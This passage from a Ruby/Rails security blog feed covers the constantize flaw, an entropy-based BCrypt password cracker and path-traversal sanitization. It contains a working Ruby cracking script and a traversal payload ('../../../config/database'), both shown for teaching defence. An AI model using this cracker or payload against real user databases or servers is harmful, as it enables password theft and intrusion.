</span><span class='line'>  <span class="o">%</span> <span class="no">Total</span>    <span class="o">%</span> <span class="no">Received</span> <span class="o">%</span> <span class="no">Xferd</span>  <span class="no">Average</span> <span class="no">Speed</span>   <span class="no">Time</span>    <span class="no">Time</span>     <span class="no">Time</span>  <span class="no">Current</span>   <span class="c1"># &lt;-- Ouch!</span>
</span><span class='line'>                                 <span class="no">Dload</span>  <span class="no">Upload</span>   <span class="no">Total</span>   <span class="no">Spent</span>    <span class="no">Left</span>  <span class="no">Speed</span>
</span><span class='line'><span class="mi">100</span>   <span class="mi">258</span>  <span class="mi">100</span>   <span class="mi">258</span>    <span class="mi">0</span>     <span class="mi">0</span>   <span class="mi">1280</span>      <span class="mi">0</span> <span class="o">--</span><span class="ss">:-</span><span class="o">-</span><span class="ss">:-</span><span class="o">-</span> <span class="o">--</span><span class="ss">:-</span><span class="o">-</span><span class="ss">:-</span><span class="o">-</span> <span class="o">--</span><span class="ss">:-</span><span class="o">-</span><span class="ss">:-</span><span class="o">-</span>  <span class="mi">1283</span>
</span></code></pre></td></tr></table></div></figure>


<p>Seeing <code>curl</code> writing progress to your Rails logs with the string <code>~/.ssh/authorized_keys</code> is not going to
make for a good day. An attacker has now gained access to your box via your web
server account. Hopefully it&rsquo;s not running as root <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/goberserk.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="goberserk">
              goberserk
              </span>
            </span>
          </p>

<h2>Safe Alternatives</h2>

<p>Having looked at what a <code>constantize</code> vulnerability is and having clearly demonstrated how that vulnerability
can be exploited, it&rsquo;s time to fix that code.</p>

<p>Usually there&rsquo;s a good reason to have a dynamic form that will use user input to decide on what class to create.
The simplest pattern that I&rsquo;ve used and seen is to use the parameter string and do an array lookup. Here&rsquo;s an example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">class</span> <span class="nc">AlertsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">create</span>
</span><span class='line'>    <span class="n">constant</span> <span class="o">=</span> <span class="o">[</span><span class="no">InfoAlert</span><span class="p">,</span> <span class="no">WarnAlert</span><span class="p">,</span> <span class="no">ErrorAlert</span><span class="o">].</span><span class="n">find</span> <span class="k">do</span> <span class="o">|</span><span class="n">alert</span><span class="o">|</span>
</span><span class='line'>      <span class="n">alert</span><span class="o">.</span><span class="n">name</span> <span class="o">==</span> <span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:type</span><span class="o">]</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">raise</span> <span class="s2">&quot;Bad hacker!&quot;</span> <span class="k">if</span> <span class="n">constant</span><span class="o">.</span><span class="n">nil?</span>  <span class="c1"># Fail hard on malicious input</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">constant</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:value</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># ... other work</span>
</span><span class='line'>    <span class="c1"># render page</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>The benefit of the above code is that you&rsquo;re no longer relying on user input to correctly define the type being instantiated.
Instead you define the available types and assert that the user input conforms to those choices, or fail hard!</p>

<p><em>This method is the safest because it never even uses <code>constantize</code> and instead relies on whitelisting safe input.</em></p>

<p><aside>
I&rsquo;ve <a href="http://gavinmiller.io/2016/creating-a-secure-sanitization-function/">written about whitelisting before</a> when dealing with
user input as it relates to filename sanitization. It is the preferred technique for writing secure code, albeit more
restrictive which is limiting.
</aside></p>

<h4><em>Update Sept 28, 2016:</em></h4>

<p>After this post made it&rsquo;s way among a few sites, <a href="http://www.swifthand.xyz/">Paul Kwiatkowski</a> suggested an alternative
pattern to safely avoid constantize which I liked. Here&rsquo;s his example code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Some file where a constant definition is appropriate.</span>
</span><span class='line'><span class="no">ALERTS</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s1">&#39;info&#39;</span> <span class="o">=&gt;</span> <span class="no">InfoAlert</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;warn&#39;</span> <span class="o">=&gt;</span> <span class="no">WarnAlert</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;error&#39;</span> <span class="o">=&gt;</span> <span class="no">ErrorAlert</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">AlertsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">create</span>
</span><span class='line'>    <span class="no">ALERTS</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:type</span><span class="o">]</span><span class="p">))</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:value</span><span class="o">]</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># ... other work</span>
</span><span class='line'>    <span class="c1"># render page</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Paul mentions that this method is beneficial because the exception handling is done automatically when a lookup
fails on fetch since it raises a <code>KeyError</code>. The other benefit that I saw in his pattern, is that it scales well
when the number of options grows large.</p>

<p>Many thanks to Paul and a few others that commented on this post. I truly enjoy receiving feedback
from others on how I can improve my code!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ruby/Rails Security Presentation]]></title>
    <link href="http://gavinmiller.io/2016/ruby-rails-security-presentation/">
    <updated>2016-05-05T16:33:00-06:00</updated>
    <id>http://gavinmiller.io/2016/ruby-rails-security-presentation</id>
    <content type="html"><![CDATA[<p>Last month, I did a private presentation for a company in Vancouver. The presentation covered:</p>

<ul>
<li><a href="http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/">Sql Injection</a></li>
<li>Timing Attacks</li>
<li><a href="http://gavinmiller.io/2015/staying-up-to-date-with-security-alerts/">Prevention</a></li>
</ul>


<p>It was mostly <a href="http://gavinmiller.io/2016/security-for-ruby-devs-presentation">a rehash of the presentation I gave on Jan 5th, 2016 to the yycrb group</a>,
but with better slides! The above links will take you to more detailed write ups on the individual topics.</p>

<script async class="speakerdeck-embed"
  data-id="de4763eaf87a40e4aed6ca9c0510a8cf"
  data-ratio="1.33333333333333"
  src="http://gavinmiller.io//speakerdeck.com/assets/embed.js"></script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Tale of Security Gone Wrong]]></title>
    <link href="http://gavinmiller.io/2016/a-tale-of-security-gone-wrong/">
    <updated>2016-03-29T16:02:00-06:00</updated>
    <id>http://gavinmiller.io/2016/a-tale-of-security-gone-wrong</id>
    <content type="html"><![CDATA[<p>I was approached recently by a friend (you can call him Jon) that had a security story to share with me.
It was an interesting scenario that could have been dire for them had they:</p>

<ol>
<li> Not discovered the problem</li>
<li> Been breached</li>
</ol>


<p>Wanting to improve the security of their application, Jon&rsquo;s team decided to implement a password entropy
feature to encourage their users to use strong passwords. This is a useful feature that companies like
Dropbox, Twitter, and eBay have implemented. Jon&rsquo;s team decided to use the <a href="https://github.com/envato/zxcvbn-ruby">Zxcvbn</a>
library to implement their entropy generator. Again nothing wrong here.</p>

<p><aside>
For those unfamiliar with entropy, in this context it is a numeric measure of password complexity.
</aside></p>

<p>Where things went off the rails is when Jon&rsquo;s team decided to store the entropy in the database. The rationale
was that as technology progressed and password cracking became easier, users could be contacted
to update their password. The trouble is that this significantly weakens password hashing
algorithms (Jon&rsquo;s team was using BCrypt) and decreases the time it takes to attack/brute force hashed passwords.</p>

<p>Thankfully this story has a happy ending and Jon&rsquo;s team discovered the issue during a
<a href="http://gavinmiller.io/2015/staying-up-to-date-with-security-alerts/">security audit</a> and yanked it immediately.</p>

<p>The rest of this post will examine how storing entropy completely destroys your hash-password security <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/hurtrealbad.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="hurtrealbad">
              hurtrealbad
              </span>
            </span>
          </p>

<h2>Using Zxcvbn to Calculate Entropy</h2>

<p><img src="http://gavinmiller.io/images/entropy/password-meter.png" alt="Dropbox using Zxcvbn" /></p>

<p>Above you can see an image of Dropbox&rsquo;s password meter. It&rsquo;s a series of bars/colors to show relative password strength.
The underlying calculations are done with the <a href="https://github.com/envato/zxcvbn-ruby">Zxcvbn library</a>.
And the code to use it is quite simple:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;zxcvbn&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">result</span> <span class="o">=</span> <span class="no">Zxcvbn</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;@lfred2004&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nb">puts</span> <span class="n">result</span><span class="o">.</span><span class="n">entropy</span>   <span class="c1"># =&gt; 14.814</span>
</span></code></pre></td></tr></table></div></figure>


<p>For Jon&rsquo;s application, when a user entered in their password, the app would calculate and store the entropy value
along with the BCrypt hashed password. Below is a simplified version of the Users table.</p>

<p><img src="http://gavinmiller.io/images/entropy/user-table.png" alt="User table with Entropy stored beside BCrypt hashed passwords" /></p>

<p>If you don&rsquo;t think about security on a regular basis, this probably looks normal.
The next question to ask, is how can an adversary with the Users table exploit the entropy value and crack passwords?</p>

<h2>Why Storing Entropy is a Terrible Idea!</h2>

<p>You see entropy is information leaking. When it comes to passwords (and secure systems in general) you want
to leak as little information as possible. Otherwise an attacker has information they can use to their advantage. To leverage this information
you need to understand a few things about hashing speeds.</p>

<p><img src="http://gavinmiller.io/images/entropy/hash-timing.png" alt="Table of hash algorithm timing" /></p>

<p>Above you can see, BCrypt takes a long time to do 10,000 password hashes compared to MD5/SHA1. BCrypt was designed to make brute forcing
password hashes expensive whereas MD5 and SHA1 weren&rsquo;t designed with that consideration. Which leads us to ask:
how long does it take to calculate Zxcvbn values?</p>

<p><img src="http://gavinmiller.io/images/entropy/zxcvbn-and-hash-timing.png" alt="Table of Zxcvbn timing along with hash algorithm timing" /></p>

<p>You can see from the above image that Zxcvbn takes significantly less time to run 10,000 iterations than BCrypt
&ndash; 124x faster. The implication then is that you can input passwords into Zxcvbn and generate a subset of candidate
passwords which can then be hashed with BCrypt. The algorithm is going to look like this:</p>

<p><img src="http://gavinmiller.io/images/entropy/cracking-process.png" alt="A visual diagram detailing the entropy cracking steps" /></p>

<ol>
<li>Get a list of common passwords (the bigger the better)</li>
<li>Run the common passwords through Zxcvbn to get an entropy value</li>
<li>Use entropy as a hash key, store the password as a value in an array</li>
<li>Sort Users table by lowest to highest entropy</li>
<li>Iterate the Users table and use the entropy column to index your hash

<ul>
<li>If a hash key is present:

<ul>
<li>The value array are candidate passwords</li>
<li>BCrypt the candidate passwords and compare to database hash</li>
</ul>
</li>
</ul>
</li>
</ol>


<h2>Writing a Cracker</h2>

<p>Let&rsquo;s write the algorithm described above. Starting with the first 3 steps:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;zxcvbn&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">tester</span> <span class="o">=</span> <span class="ss">Zxcvbn</span><span class="p">:</span><span class="ss">:Tester</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="n">entropies</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="n">dictionary_pwds</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;common_passwords.txt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'>
</span><span class='line'><span class="n">dictionary_pwds</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:chomp</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">pwd</span><span class="o">|</span>
</span><span class='line'>  <span class="n">value</span> <span class="o">=</span> <span class="n">tester</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="n">entropy</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">entropies</span><span class="o">[</span><span class="n">value</span><span class="o">]</span> <span class="o">||=</span> <span class="o">[]</span>
</span><span class='line'>  <span class="n">entropies</span><span class="o">[</span><span class="n">value</span><span class="o">]</span> <span class="o">&lt;&lt;</span> <span class="n">pwd</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>The result of the above is a hash of arrays with the key being the entropy
for the passwords in the value array:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="mi">0</span><span class="o">.</span><span class="mi">0</span>    <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;james&#39;</span><span class="p">,</span> <span class="s1">&#39;smith&#39;</span><span class="p">,</span> <span class="s1">&#39;mary&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>  <span class="mi">11</span><span class="o">.</span><span class="mi">784</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;Turkey50&#39;</span><span class="p">,</span> <span class="s1">&#39;zigzag&#39;</span><span class="p">,</span> <span class="s1">&#39;bearcat&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>  <span class="mi">11</span><span class="o">.</span><span class="mi">236</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;samsung1&#39;</span><span class="p">,</span> <span class="s1">&#39;istheman&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>  <span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'>  <span class="mi">17</span><span class="o">.</span><span class="mi">434</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;01012011&#39;</span><span class="p">,</span> <span class="s1">&#39;01011980&#39;</span><span class="p">,</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="s1">&#39;01011910&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>  <span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next part of the algorithm loads the database, sorts by lowest to highest entropy (easiest to
hardest), and tries to crack the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;sqlite3&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;bcrypt&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Open a SQLite 3 database file</span>
</span><span class='line'><span class="n">db</span> <span class="o">=</span> <span class="ss">SQLite3</span><span class="p">:</span><span class="ss">:Database</span><span class="o">.</span><span class="n">new</span> <span class="s1">&#39;entropy.sqlite3&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users ORDER BY entropy&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">user</span><span class="o">|</span>
</span><span class='line'>  <span class="c1"># Load user record</span>
</span><span class='line'>  <span class="n">email</span>       <span class="o">=</span> <span class="n">user</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span>
</span><span class='line'>  <span class="n">pwd_hash</span>    <span class="o">=</span> <span class="n">user</span><span class="o">[</span><span class="mi">6</span><span class="o">]</span>
</span><span class='line'>  <span class="n">pwd_entropy</span> <span class="o">=</span> <span class="n">user</span><span class="o">[</span><span class="mi">7</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">puts</span> <span class="s2">&quot;User: </span><span class="si">#{</span><span class="n">email</span><span class="si">}</span><span class="s2">, entropy: </span><span class="si">#{</span><span class="n">pwd_entropy</span><span class="si">}</span><span class="s2">, password_hash: </span><span class="si">#{</span><span class="n">pwd_hash</span><span class="si">}</span><span class="s2"> &quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">candidate_passwords</span> <span class="o">=</span> <span class="n">entropies</span><span class="o">[</span><span class="n">pwd_entropy</span><span class="o">]</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">candidate_passwords</span> <span class="o">!=</span> <span class="kp">nil</span>
</span><span class='line'>    <span class="n">passwords</span> <span class="o">=</span> <span class="n">candidate_passwords</span><span class="o">.</span><span class="n">select</span> <span class="k">do</span> <span class="o">|</span><span class="n">candidate</span><span class="o">|</span>
</span><span class='line'>      <span class="ss">BCrypt</span><span class="p">:</span><span class="ss">:Password</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pwd_hash</span><span class="p">)</span> <span class="o">==</span> <span class="n">candidate</span>
</span><span class='line'>    <span class="k">end</span><span class="o">.</span><span class="n">flatten</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># Should be 0 or 1 -- if &gt; 1, something wrong</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">passwords</span><span class="o">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span>
</span><span class='line'>      <span class="nb">puts</span> <span class="s2">&quot;No Matching Candidates&quot;</span>
</span><span class='line'>    <span class="k">elsif</span> <span class="n">passwords</span><span class="o">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">1</span>
</span><span class='line'>      <span class="nb">puts</span> <span class="s2">&quot;Password is: </span><span class="si">#{</span><span class="n">passwords</span><span class="o">.</span><span class="n">first</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="nb">puts</span> <span class="s2">&quot;No Candidates Found&quot;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s it. There&rsquo;s nothing overly difficult in this algorithm. It&rsquo;s basically 3 loops and a couple
of hash functions, but what drops out is non-trivial. If this were a real database, you&rsquo;d have email and password
combinations flying at you. Which is a real problem that means you&rsquo;re losing your user&rsquo;s information!</p>

<p>As I mentioned, this was a good news story for Jon and his team when they discovered this issue without their
database getting compromised and seeing their names in the news. However, that was not the case for Ashley
Madison. That&rsquo;s right! Ashley Madison made a similar error when they
<a href="http://cynosureprime.blogspot.ca/2015/09/how-we-cracked-millions-of-ashley.html">stored the MD5 hash of their user&rsquo;s passwords in their database</a>
alongside the BCrypted hashes. This lead researchers to crack almost 1/3 of their 30 million password hashes!</p>

<p>While it&rsquo;s nice to feel smug and laugh at Ashley Madison&rsquo;s peril, there is a real possibility that you&rsquo;ve
done something equally <del>stupid</del> compromising in your own database. I&rsquo;ve posted
<a href="https://github.com/gavingmiller/entropy-password-cracker">the code and an example database on github</a>,
take a look at the code and see if you can write your own cracker.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Security for JS Developers: A Presentation]]></title>
    <link href="http://gavinmiller.io/2016/security-for-js-devs-presentation/">
    <updated>2016-02-17T19:51:00-07:00</updated>
    <id>http://gavinmiller.io/2016/security-for-js-devs-presentation</id>
    <content type="html"><![CDATA[<p>On Feb 16th, 2016 I gave a presentation to <a href="http://yycjs.com">yycjs</a> on security for JS developers. The presentation covers:</p>

<ul>
<li><a href="http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/">Sql Injection</a></li>
<li>Timing Attacks</li>
<li><a href="http://gavinmiller.io/2016/a-tale-of-security-gone-wrong/">Entropy Attacks</a></li>
</ul>


<p>The above link will take you to detailed explanations on the topic I&rsquo;ve done previously &mdash; and I&rsquo;ll work on getting a post
developed for the timing attack.</p>

<p>As part of the presentation I used a neat tool called <a href="http://sqlmap.org/">sqlmap</a> which you can read more about. And I also referenced BCrypt multiple times. There are good reads on <a href="https://codahale.com/how-to-safely-store-a-password/">BCrypt</a> and <a href="https://paragonie.com/blog/2016/02/how-safely-store-password-in-2016">hashing passwords in 2016</a>.</p>

<script async class="speakerdeck-embed"
  data-id="4e4e4bb253d44a49b929d8b5802e6bf1"
  data-ratio="1.33333333333333"
  src="http://gavinmiller.io//speakerdeck.com/assets/embed.js"></script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Creating A Safe Filename Sanitization Function]]></title>
    <link href="http://gavinmiller.io/2016/creating-a-secure-sanitization-function/">
    <updated>2016-01-24T18:14:00-07:00</updated>
    <id>http://gavinmiller.io/2016/creating-a-secure-sanitization-function</id>
    <content type="html"><![CDATA[<p>In a previous post on <a href="http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails/">File Access Vulnerabilities</a>
I mentioned the use of a sanitize function. Sanitize functions are needed because you don&rsquo;t always have full control of
file names or file paths provided by a user. And when you can&rsquo;t control file names/paths the attack surface of your
application increase.</p>

<p>This post will work through the creation of a file sanitization function, contrast whitelisting vs blacklisting,
and look at a gem to handle sanitization.</p>

<p>Let&rsquo;s start with an example of code that would need a sanitize function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">download</span>
</span><span class='line'>  <span class="n">language_code</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="ss">:code</span><span class="o">]</span>
</span><span class='line'>  <span class="n">send_file</span><span class="p">(</span>
</span><span class='line'>    <span class="s2">&quot;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/config/locales/</span><span class="si">#{</span><span class="n">language_code</span><span class="si">}</span><span class="s2">.yml&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="ss">filename</span><span class="p">:</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">language_code</span><span class="si">}</span><span class="s2">.yml&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="ss">type</span><span class="p">:</span> <span class="s2">&quot;application/yml&quot;</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is from a <a href="http://stackoverflow.com/questions/27756065/how-to-securely-download-files">question asked on StackOverflow</a>.
The questioner stated that <code>param[:code]</code> was dynamic and couldn&rsquo;t be determined a priori. They were correct in
assessing that this is vulnerable to an attacker submitting an HTTP request with the parameter of:
<code>code=../../../config/database</code>. Bam! Compromised <code>database.yml</code> file.</p>

<p>This means that the above function needs to be sanitized so that the system doesn&rsquo;t get compromised.</p>

<h2>Whitelisting vs Blacklisting</h2>

<p>There are two main methods you can use to sanitize user input: whitelisting or blacklisting.</p>

<ul>
<li><strong>Whitelisting</strong> is the act of setting what characters are allowed.</li>
<li><strong>Blacklisting</strong> is setting what characters are not allowed.</li>
</ul>


<p>The distinction is subtle but makes a huge different for security and usability of a function.</p>

<p>Generally speaking you want to use a whiltelisting function before a blacklisting function. This is because
whitelists (if done properly) are safer &ndash; you&rsquo;re stating what is allowed vs trying to exclude all the
bad things that shouldn&rsquo;t be allowed. In such a case you&rsquo;ll typically miss something and viola an attacker
has an in. You&rsquo;re smart, but when someone is motivated they&rsquo;ll figure out a way to be smarter then you!</p>

<p><aside>
In the above case, the questioner said that they didn&rsquo;t know what <code>language_code</code> could be ahead of
time. I&rsquo;d call this into question given that the files are coming out of <code>config/locales</code>, meaning that
it&rsquo;s a language translation file, meaning that there&rsquo;s going to be a limited number that exist and likely not by the users, but by the system creators.</p>

<p>It&rsquo;s trivial to enumerate the files in this directory and provide a list to the user mapped to
a hash or GUID and then provide a drop down list for the user to choose from. This is called
<a href="http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails#restriction-via-identifier">restriction via identifier which I&rsquo;ve written about before</a>.
</aside></p>

<p>This particular instance is nice since the download is restricted to <code>.yml</code> files, meaning you can be extra
aggressive in your whitelisting. Let&rsquo;s write a naive whitelist function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">sanitize</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span><span class='line'>  <span class="c1"># Remove any character that aren&#39;t 0-9, A-Z, or a-z</span>
</span><span class='line'>  <span class="n">filename</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="sr">/[^0-9A-Z]/i</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the above case, if you used the malicious string <code>../../../config/database</code> the output is just what you&rsquo;d
want: <code>_________config_database</code>. The slashes and dots are all removed and your <code>database.yml</code> is safe. You could have
skipped replacing the &lsquo;bad&rsquo; characters
with an underscore <code>_</code>, but I prefer underscores since it&rsquo;s more friendly/readable for the normal,
non-attacker use case.</p>

<p>But! (there&rsquo;s always a but) You&rsquo;ve got some additional considerations. While the above function is safe,
it is limited to a minimal character set. What happens if you inserted any of these characters:
<code>é 猪 <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f437.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="pig">
              pig
              </span>
            </span>
          </code> into that function? They get stripped out!</p>

<p>In this case, you&rsquo;re probably ok with that given the context of the files. You likely have full control
of the language files so you can make assertions in your sanitization. But that&rsquo;s not always the case.</p>

<p>This is where whitelists can become unwieldly. As a programmer you don&rsquo;t want to go and define every single
character that you want to allow; that&rsquo;s tedious. That&rsquo;s where the blacklist function comes in. Let&rsquo;s see that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
